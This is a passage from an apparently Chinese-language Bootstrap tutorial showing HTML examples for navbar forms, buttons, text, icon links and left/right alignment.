class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;collapse navbar-collapse&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;example-navbar-collapse&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-3-表单"><a href="#2-3-表单" class="headerlink" title="2.3 表单"></a>2.3 表单</h3><p>将表单放置于 <code>.navbar-form</code> 之内可以呈现很好的垂直对齐，并在较窄的视口（viewport）中呈现折叠状态。 使用对齐选项可以规定其在导航条上出现的位置。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//单独表单<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-form navbar-left&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><br>//导航栏中的表单<br><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-form navbar-left&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-按钮"><a href="#2-4-按钮" class="headerlink" title="2.4 按钮"></a>2.4 按钮</h3><p>对于不包含在 <code>&lt;form&gt;</code> 中的 <code>&lt;button&gt;</code> 元素，加上 <code>.navbar-btn</code> 后，可以让它在导航条里垂直居中。</p><p>使用  <code>.navbar-btn</code> 向不在 <form> 中的 <button> 元素添加按钮，按钮在导航栏上垂直居中。<code>.navbar-btn</code> 可被使用在 <a> 和 <input> 元素上。不要在 <code>.navbar-nav</code> 内的 <a> 元素上使用 <code>.navbar-btn</code>，因为它不是标准的 button 类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default navbar-btn&quot;</span>&gt;</span>Sign in<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-form navbar-left&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Search&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span>提交按钮<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default navbar-btn&quot;</span>&gt;</span><br>            导航栏按钮<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-5-文本"><a href="#2-5-文本" class="headerlink" title="2.5 文本"></a>2.5 文本</h3><p>把文本包裹在 <code>.navbar-text</code>中时，为了有正确的行距和颜色，通常使用 <code>&lt;p&gt;</code> 标签。在导航中包含文本字符串，使用  <code>.navbar-text</code>。这通常与 <p> 标签一起使用，确保适当的前导和颜色。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-text&quot;</span>&gt;</span>Runoob 用户登录<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-6-带图标的导航链接"><a href="#2-6-带图标的导航链接" class="headerlink" title="2.6 带图标的导航链接"></a>2.6 带图标的导航链接</h3><p>在常规的导航栏导航组件内使用图标，使用  <code>glyphicon glyphicon-*</code> 来设置图标。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav navbar-right&quot;</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-user&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> 注册<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;glyphicon glyphicon-log-in&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> 登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span> <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-7-组件对齐"><a href="#2-7-组件对齐" class="headerlink" title="2.7 组件对齐"></a>2.7 组件对齐</h3><p>通过添加 <code>.navbar-left</code> 和 <code>.navbar-right</code> 工具类让导航链接、表单、按钮或文本对齐。两个类都会通过 CSS 设置特定方向的浮动样式。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-default&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container-fluid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-header&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>墨水记忆<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--向左对齐--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav navbar-left&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java<br>                    <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>另一个分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-form navbar-left&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;search&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span>&gt;</span><br>                向左对齐-提交按钮<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-text navbar-left&quot;</span>&gt;</span>向左对齐-文本<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--向右对齐--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav navbar-nav navbar-right&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>                    Java <span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jmeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Jasper Report<span 